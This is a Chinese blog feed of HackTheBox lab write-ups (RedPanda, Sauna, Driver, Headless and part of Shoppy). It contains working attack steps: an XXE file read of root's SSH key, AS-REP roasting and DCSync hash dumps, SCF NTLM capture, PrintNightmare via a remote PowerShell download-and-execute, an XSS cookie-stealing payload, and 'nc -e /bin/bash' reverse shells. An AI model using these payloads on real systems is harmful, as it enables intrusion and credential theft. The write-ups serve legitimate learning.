<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addViewTo</span><span class="params">(String path, String uri)</span> <span class="keyword">throws</span> JDOMException, IOException &#123;</span><br><span class="line">        <span class="type">SAXBuilder</span> <span class="variable">saxBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">        <span class="type">XMLOutputter</span> <span class="variable">xmlOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLOutputter</span>();</span><br><span class="line">        xmlOutput.setFormat(Format.getPrettyFormat());</span><br><span class="line">        <span class="type">File</span> <span class="variable">fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> saxBuilder.build(fd);</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getRootElement();</span><br><span class="line">        <span class="keyword">for</span> (Element el : rootElement.getChildren()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (el.getName() == <span class="string">&quot;image&quot;</span> &amp;&amp; el.getChild(<span class="string">&quot;uri&quot;</span>).getText().equals(uri)) &#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">totalviews</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).getText()) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Total views:&quot;</span> + Integer.toString(totalviews.intValue()));</span><br><span class="line">                rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).setText(Integer.toString(totalviews.intValue()));</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">views</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(el.getChild(<span class="string">&quot;views&quot;</span>).getText()));</span><br><span class="line">                el.getChild(<span class="string">&quot;views&quot;</span>).setText(Integer.toString(views.intValue() + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fd));</span><br><span class="line">        xmlOutput.output(doc, writer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里就存在XXE漏洞，在网站点击导出表格的功能时，就会触发，而且在这里解析的文件路径path是可控的，我们可以通过控制uri的值，控制 <code>artist</code>值</p>
<h4 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool shy.jpg -Artist=&quot;../home/woodenk/aaa&quot;</span><br></pre></td></tr></table></figure>

<p>先自己准备一张图片，用工具增加Artist字段，然后上传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:~$ cat aaa_creds.xml </span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY pencer SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&gt; ]&gt;&lt;credits&gt;</span><br><span class="line">  &lt;author&gt;damian&lt;/author&gt;</span><br><span class="line">  &lt;image&gt;</span><br><span class="line">    &lt;uri&gt;../../../home/woodenk/shy.jpg&lt;/uri&gt;</span><br><span class="line">    &lt;hello&gt;&amp;pencer;&lt;/hello&gt;</span><br><span class="line">    &lt;views&gt;4&lt;/views&gt;</span><br><span class="line">  &lt;/image&gt;</span><br><span class="line">  &lt;totalviews&gt;4&lt;/totalviews&gt;</span><br><span class="line">&lt;/credits&gt;</span><br></pre></td></tr></table></figure>

<p>在靶机新建一个xml文件，里面使用到文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080 -H &quot;User-Agent: ||/../../../../../../../home/woodenk/shy.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>curl访问，增加字段到log文件，这一步是在控制uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:/opt/panda_search$ ^[[A</span><br><span class="line">cat redpanda.log </span><br><span class="line"></span><br><span class="line">200||10.10.16.14||||/../../../../../../../home/woodenk/shy.jpg||/</span><br></pre></td></tr></table></figure>

<p>因为我们在UA头前面多插入了一个||，这样本来是第三个字段的ua头被我们控制成第四个，也就是uri</p>
<p>最后访问网址触发功能点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080/export.xml?author=damian</span><br></pre></td></tr></table></figure>

<p>等一会，再查看aaa_creds.xml，就能看到我们要读取到内容，接下来就是用id_rsa登陆root，结束。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924191714.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，第一次接触java的ssti，虽然这次是直接套payload，然后靶机内信息搜集也挺需要耐心的，代码审计触发xxe漏洞那块，一开始看wp还感觉很麻烦，自己写复盘一路顺下来才理解，学习了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Sauna复盘</title>
    <url>/2024/04/09/htb-Sauna%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>继续记录学习📑</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/" >http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/network/286137.html" >https://m.freebuf.com/articles/network/286137.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_34801745/article/details/108136791" >https://blog.csdn.net/qq_34801745/article/details/108136791<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Sauna" >https://app.hackthebox.com/machines/Sauna<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：<strong>10.10.10.175</strong></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先扫端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.10.175</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184941.png"   style="zoom:30%;" >

<p>扫出来有很多个端口，有kerberos+ldap等，大概率是域控，域名：EGOTISTICAL-BANK.LOCAL0.</p>
<h5 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L \\\\10.10.10.175 -N</span><br></pre></td></tr></table></figure>

<p>尝试smb匿名登陆，没发现什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409185909.png" ></p>
<h5 id="ldap枚举"><a href="#ldap枚举" class="headerlink" title="ldap枚举"></a>ldap枚举</h5><p>对于389的ladp服务，存在一个匿名绑定功能，通过这个功能可以不通过身份认证查询用户、组和计算机信息，我们尝试使用<a class="link"   href="https://github.com/ropnop/windapsearch" >windapsearch<i class="fas fa-external-link-alt"></i></a>看看能不能利用成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190131.png" ></p>
<p>没有什么收获</p>
<h5 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h5><p>80端口有开放，可以访问到网页，提示是说有个about.html，里面有很多人名</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184647.png"   style="zoom:50%;" >

<p>收集起来建一个user.txt，然后用<a class="link"   href="https://github.com/urbanadventurer/username-anarchy" >username-anarchy<i class="fas fa-external-link-alt"></i></a>生成一个字典</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184624.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./username-anarchy --input-file user.txt --select-format first,flast,first.last,firstl &gt; unames.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190453.png" ></p>
<h5 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h5><p>用字典可以查看是否有用户不需要经过Kerberos预身份验证。如果存在那么我们就可以得到其密码hash</p>
<blockquote>
<p> Kerberos 预⾝份验证是⼀项安全功能，可防⽌密码猜测攻击。在某些情况下，应⽤程序需要为其服务帐⼾启⽤此设</p>
<p>置。当不强制执⾏预认证时，可以直接发送虚拟认证请求。域控制器的密钥分发中⼼，（KDC）将检查⾝份验证服务请求（AS-REQ），验证⽤⼾信息并返回加密的票证授予票证（TGT）。 TGT 包含使⽤相应帐⼾的 NTLM 哈希加密的材料（时间戳）。可以从中派⽣出哈希值，该哈希值可以受到离线暴⼒攻击以泄露明⽂密码。</p>
</blockquote>
<p>这里用到impacket的脚本GetNPUsers.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile unames.txt  -outputfile hashes.asreproast -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191257.png" ></p>
<p>成功拿到一串hash，用hashcat爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<p>拿到密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191433.png" ></p>
<p>拿账号密码用Evil-WinRM登陆，拿到第一个flag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191657.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>上传一个winPEASany.exe，运行看看有什么可以提取的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.22.45.png" ></p>
<p>发现一串密码和一个新的用户svc_loanmgr，拿着这个再次登陆</p>
<p>用“net users svc_loanmgr”查看用户详细信息，发现是个Remote Management Users组</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.47.54.png"   style="zoom:50%;" >

<p>再看看这个组的情况，net localgroup “Remote Management Users”</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409195851.png" ></p>
<p>“ Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.”</p>
<p>该组成员具有远程管理系统的能力，权限达到管理，所以存在DCSync 攻击</p>
<blockquote>
<p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
<p>DCSync 是域渗透中经常会用到的技术，其被整合在了 Mimikatz 中。在 DCSync 功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。</p>
</blockquote>
<p>使用secretsdump.py脚本复制权限为所有域⽤⼾显⽰ NTLM 哈希值。运⾏以下命令来转储主域管理员的密码哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409200452.png" ></p>
<p>成功拿到hash，然后再登陆，成功拿到管理员权限</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409201438.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：网页发现用户名–&gt;生成字典–&gt;查看是否有用户不需要Kerberos 预⾝份验证–&gt;拿到第一个账号密码–&gt;提权工具找到自动登录的账户密码–&gt;查看域内信息–&gt;发现DCSync 攻击–&gt;抓到管理员的hash–&gt;提权成功</p>
<p>新的知识点：Kerberos 预⾝份验证，自动化提权检测工具，DCSync 攻击。。</p>
<p>本来想试一下BloodHound查看域内信息，总是失败，不过看官方题解也能懂，可惜就记录不下来了</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb driver复盘</title>
    <url>/2024/04/10/htb-driver%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>📝📝📝</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p>👍：<a class="link"   href="https://npfs06.top/2021/11/28/Hacktehbox-Driver/" >https://npfs06.top/2021/11/28/Hacktehbox-Driver/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >https://m.freebuf.com/articles/web/318970.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Driver" >https://app.hackthebox.com/machines/Driver<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.11.106</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.106</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085005.png" ></p>
<p>开的端口不少，有445端口（SMB），5985证明可以用evil-winrm登陆</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085356.png"   style="zoom:30%;" >

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085439.png" ></p>
<p>枚举和smbclient都找不到有效信息，而且这个windows版本是10，用不了永恒之蓝（知识点摄入了！）</p>
<p>看到80端口开放，有个登陆口，猜测是弱口令’admin:admin’，成功了，进入发现是个打印系统</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410084730.png"   style="zoom:50%;" >

<p>扫目录扫不到什么东西，但是很容易找到一个文件上传点，结合前面开的SMB，尝试<strong>通过NTLM捕获进行SMB攻击</strong></p>
<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >何为通过NTLM捕获进行SMB攻击<i class="fas fa-external-link-alt"></i></a> 这篇文章写的很清楚👍，接下来跟着利用就行</p>
<p>1.先写一个scf文件（<em>SCF文件</em>是“WINDOWS资源管理器命令”文件，它也是一种可执行文件）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.3\tools\nc.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<p>2.上传恶意文件让网络中的用户（受害者）试图访问我们的共享文件，这时Responder说：请提供给我NTLMv2哈希并访问资源，Responder就收到受害的hash了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -w -I tun0</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410091850.png"   style="zoom:50%;" >

<p>然后上传scf文件，然后就抓到一串hash</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092123.png" ></p>
<p>hashcat爆破，爆出密码为liltony</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092222.png" ></p>
<p>拿着账号密码登陆tony账户，成功拿到第一个flag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092334.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-process # 查看进程</span><br></pre></td></tr></table></figure>

<p>找到一个spoolsv，网上能找到公开漏洞</p>
<p><a class="link"   href="https://github.com/calebstewart/CVE-2021-1675" >https://github.com/calebstewart/CVE-2021-1675<i class="fas fa-external-link-alt"></i></a></p>
<p>下载poc放到网站目录下，让靶机下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.3/CVE-2021-1675.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>添加一个新的用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;abc&quot; -NewPassword &quot;abc123&quot;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-10%2009.29.46.png" ></p>
<p>查看管理员组，确认权限没问题</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093053.png" ></p>
<p>再用evil-winRM登陆，这个时候就是管理员权限了，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093255.png" ></p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在历史命令文件中找到RICOH PCL6 UniversalDriver V4.23服务，msf有相关poc可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410100736.png" ></p>
<p>但是跟着wp一直利用失败，这里就留一个未解决的事项吧。。。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：80端口通过弱口令–&gt;找到文件上传点–&gt;结合SMB服务进行scf攻击抓到用户密码hash–&gt;发现存在公开漏洞的服务spoolsv&#x2F;ricoh–&gt;l利用公开poc提权</p>
<p>涉及：smb端口scf攻击，学到了！</p>
<p>也是尝试了用msf拿到shell，方法二提权失败有待研究，目前花太多时间在这上面，以后再好好研究吧</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb headless复盘</title>
    <url>/2024/04/05/htb-headless%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>刚开始接触htb，感觉很有收获，记录一下</p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Headless" >https://app.hackthebox.com/machines/Headless<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.8</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到22端口和5000端口，5000端口是upnp服务，要用http协议访问</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405110933.png" ></p>
<p>能看到一个表单，思路是ssti，sql注入，xss，先尝试ssti</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405111018.png" ></p>
<p>被拦截了，而且信息还说会把相关信息发给管理员，<strong>思路来了，这地方就可以考虑xss</strong></p>
<p>构造一个恶意xss数据包，同时还要在本地用python开启一个http服务看返回的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5666</span><br></pre></td></tr></table></figure>

<p>发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /support HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">Content-Length: 59</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: &lt;img src=15m0 onerror=fetch(&quot;http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.11.8:5000/support</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fname=1&amp;lname=1&amp;email=1@1.com&amp;phone=1&amp;message=1%0a&#123;&#123;1*1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>User-Agent: &lt;img src&#x3D;15m0 onerror&#x3D;fetch(“<a class="link"   href="http://10.10.16.19:5666/?cookie=%22+document.cookie);%3E" >http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;<i class="fas fa-external-link-alt"></i></a></strong>  重点是这个</p>
<p>然后等待一下，就弹回了cookie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112257.png" ></p>
<p>同时dirsearch扫出来dashboard目录</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112318.png" ></p>
<p>拿到了cookie在访问dashboard就不会401了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112541.png" ></p>
<h4 id="Userflag"><a href="#Userflag" class="headerlink" title="Userflag"></a>Userflag</h4><p>抓包发现有post发送了了一个date数据，这里的思路是命令注入，有点难想到吧</p>
<p>在date后面加；然后写入命令反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dashboard HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.11.8:5000/dashboard</span><br><span class="line">Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">date=2023-09-15;nc -e /bin/bash 10.10.16.19 1234</span><br></pre></td></tr></table></figure>

<p>nc开启监听，成功拿到shell，拿到user.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405113521.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l 查到一个syscheck，是个脚本文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114121.png" ></p>
<p>主要调用了initdb.sh，那思路就是往里面写命令就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; &gt; initdb.sh</span><br></pre></td></tr></table></figure>

<p>然后sudo &#x2F;usr&#x2F;bin&#x2F;syscheck，本地开启监听</p>
<p>成功拿到root</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114946.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场还是挺简单的，比较有特色的是5000端口判断xss那里，体验了真实构造恶意代码拿到cookie，还有命令注入那里比较难想，提权就还好。</p>
<h5 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h5><p><a class="link"   href="https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c" >https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/m0_60351808/article/details/137128551" >https://blog.csdn.net/m0_60351808/article/details/137128551<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Shoppy复盘</title>
    <url>/2024/09/13/htb-Shoppy%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -A -p- --min-rate=1000 -T4 10.10.11.180</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 22:56 PDT</span><br><span class="line">Nmap scan report for shoppy.htb (10.10.11.180)</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)</span><br><span class="line">|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)</span><br><span class="line">|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)</span><br><span class="line">80/tcp   open  http     nginx 1.23.1</span><br><span class="line">|_http-title:             Shoppy Wait Page        </span><br><span class="line">|_http-server-header: nginx/1.23.1</span><br><span class="line">9093/tcp open  copycat?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">。。。。</span><br><span class="line">OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%</span><br><span class="line">OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 53/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   407.75 ms 10.10.16.1</span><br><span class="line">2   407.83 ms shoppy.htb (10.10.11.180)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 235.39 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开了三个端口，9093端口访问后看起来像是配置文件，没找到什么有用的东西（后来看别的wp说这能看出这台机器有mattermost服务）</p>
<p>有个域名 <code>shoppy.htb</code>，扫子域名扫到mattermost，都添加到hosts里，mattermost这个域名需要账号密码登陆</p>
<p>shoppy.htb这个扫目录扫到登陆口&#x2F;login，然后看官方对这个机器的介绍是存在Nosql注入</p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><blockquote>
<p>Nosql注入介绍以及payload</p>
<p><a class="link"   href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" >https://nullsweep.com/a-nosql-injection-primer-with-mongo/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/9908?time__1311=n4+xnD0DuDRDci730=D/iaRmxjhhIWDRxD5t4+Qx" >https://xz.aliyun.com/t/9908?time__1311=n4%2BxnD0DuDRDci730%3DD%2FiaRmxjhhIWDRxD5t4%2BQx<i class="fas fa-external-link-alt"></i></a></p>
